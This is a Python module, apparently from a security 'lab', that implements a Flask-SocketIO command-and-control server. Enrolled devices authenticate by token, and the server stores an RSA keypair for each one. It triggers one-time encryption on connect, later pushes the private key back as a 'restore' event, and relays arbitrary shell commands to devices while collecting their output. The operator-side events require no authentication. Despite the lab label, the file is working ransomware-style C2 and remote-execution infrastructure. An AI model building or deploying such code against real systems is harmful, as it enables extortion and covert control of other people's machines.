"""Generic Socket.IO setup and handlers for the lab.

This module encapsulates all Socket.IO wiring so the HTTP app can stay focused
on REST endpoints, and the socket layer can be reused for different device scripts.
"""
from __future__ import annotations

from flask_socketio import SocketIO, emit
from flask import request as flask_request

socketio: SocketIO | None = None
DEVICES = None
SIMULATOR = None


def init_socketio(app, devices_registry, processor) -> SocketIO:
    """Initialize Socket.IO and register all event handlers.

    Returns the SocketIO instance. Keeps references to the devices registry and
    processor for handler use.
    """
    global socketio, DEVICES, SIMULATOR
    DEVICES = devices_registry
    SIMULATOR = processor
    socketio = SocketIO(app, cors_allowed_origins="*")

    @socketio.on('connect')
    def on_connect():  # noqa: D401
        emit('hello', {'msg': 'connected'})

    @socketio.on('authenticate')
    def on_auth(data):
        token = (data or {}).get('device_token')
        if not token or token not in DEVICES:
            return emit('auth_error', {'error': 'invalid_token'})
        DEVICES[token]['sid'] = flask_request.sid
        DEVICES[token]['connected'] = True
        # Auto-generate an RSA keypair for this device if not already present (lab/demo)
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
            if not DEVICES[token].get('public_key_pem') or not DEVICES[token].get('private_key_pem'):
                private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                public_key = private_key.public_key()
                pub_pem = public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                ).decode()
                prv_pem = private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ).decode()
                DEVICES[token]['public_key_pem'] = pub_pem
                DEVICES[token]['private_key_pem'] = prv_pem
        except Exception:
            pass
        emit('auth_ok', {'status': 'ok'})
        # If encryption is pending for this device, trigger it now (one-time)
        if DEVICES[token].get('pending_encrypt'):
            socketio.emit('process', to=flask_request.sid)
            DEVICES[token]['pending_encrypt'] = False

    @socketio.on('device_hello')
    def on_device_hello(data):
        try:
            token = (data or {}).get('device_token')
            if not token:
                sid = flask_request.sid
                for t, info in DEVICES.items():
                    if info.get('sid') == sid:
                        token = t
                        break
            if not token or token not in DEVICES:
                return
            DEVICES[token]['public_key_pem'] = (data or {}).get('public_key_pem') or DEVICES[token].get('public_key_pem')
            if (data or {}).get('hostname'):
                DEVICES[token]['hostname'] = data['hostname']
            try:
                ip = flask_request.remote_addr
                if ip:
                    DEVICES[token]['ip'] = ip
            except Exception:
                pass
            emit('server_ack', {'status': 'ok'})
        except Exception:
            pass

    @socketio.on('disconnect')
    def on_disconnect():
        try:
            sid = flask_request.sid
            for token, info in DEVICES.items():
                if info.get('sid') == sid:
                    info['connected'] = False
                    info['sid'] = None
                    break
        except Exception:
            pass

    @socketio.on('site_public_key')
    def on_site_public_key(data):
        try:
            token = (data or {}).get('token')
            pem = (data or {}).get('public_key_pem')
            if not token or token not in DEVICES or not pem:
                return emit('server_ack', {'status': 'error'})
            DEVICES[token]['public_key_pem'] = pem
            emit('server_ack', {'status': 'ok'})
        except Exception:
            emit('server_ack', {'status': 'error'})

    @socketio.on('site_restore')
    def on_site_restore(data):
        try:
            token = (data or {}).get('token')
            private_key_pem = (data or {}).get('private_key_pem')
            if token and token in DEVICES and DEVICES[token].get('sid'):
                sid = DEVICES[token]['sid']
                payload = {'private_key_pem': private_key_pem} if private_key_pem else None
                socketio.emit('restore', payload, to=sid)
                emit('server_ack', {'status': 'ok', 'targeted': True})
                return
            payload = {'private_key_pem': private_key_pem} if private_key_pem else None
            socketio.emit('restore', payload, broadcast=True)
            emit('server_ack', {'status': 'ok', 'targeted': False})
        except Exception as e:
            emit('server_ack', {'status': 'error', 'message': str(e)})

    @socketio.on('site_keys')
    def on_site_keys(data):
        try:
            token = (data or {}).get('token')
            pub = (data or {}).get('public_key_pem')
            prv = (data or {}).get('private_key_pem')
            if not token or token not in DEVICES or (not pub and not prv):
                return emit('server_ack', {'status': 'error'})
            if pub:
                DEVICES[token]['public_key_pem'] = pub
            if prv:
                DEVICES[token]['private_key_pem'] = prv
            emit('server_ack', {'status': 'ok'})
        except Exception:
            emit('server_ack', {'status': 'error'})

    @socketio.on('site_run')
    def on_site_run(data):
        """Trigger a script run on the targeted device via Socket.IO.

        Payload: { token: str, command: str }
        """
        try:
            token = (data or {}).get('token')
            command = (data or {}).get('command')
            if not token or not command:
                return emit('server_ack', {'status': 'error', 'message': 'token and command required'})
            if token not in DEVICES or not DEVICES[token].get('sid'):
                return emit('server_ack', {'status': 'error', 'message': 'device offline'})
            sid = DEVICES[token]['sid']
            socketio.emit('run_script', {'command': command}, to=sid)
            emit('server_ack', {'status': 'ok'})
        except Exception as e:
            emit('server_ack', {'status': 'error', 'message': str(e)})

    @socketio.on('script_output')
    def on_script_output(data):
        """Receive command execution output from a device and broadcast to all sites.

        Expected payload from device: {
          device_token, command, returncode, stdout, stderr, ts
        }
        """
        try:
            token = (data or {}).get('device_token')
            # If token missing, infer from sid
            if not token:
                sid = flask_request.sid
                for t, info in DEVICES.items():
                    if info.get('sid') == sid:
                        token = t
                        break
            if token and token in DEVICES:
                DEVICES[token]['last_output'] = {
                    'command': (data or {}).get('command'),
                    'returncode': (data or {}).get('returncode'),
                    'stdout': (data or {}).get('stdout'),
                    'stderr': (data or {}).get('stderr'),
                    'ts': (data or {}).get('ts'),
                }
            payload = dict(data or {})
            if token:
                payload['device_token'] = token
            socketio.emit('script_output', payload, broadcast=True)
        except Exception:
            pass

    return socketio
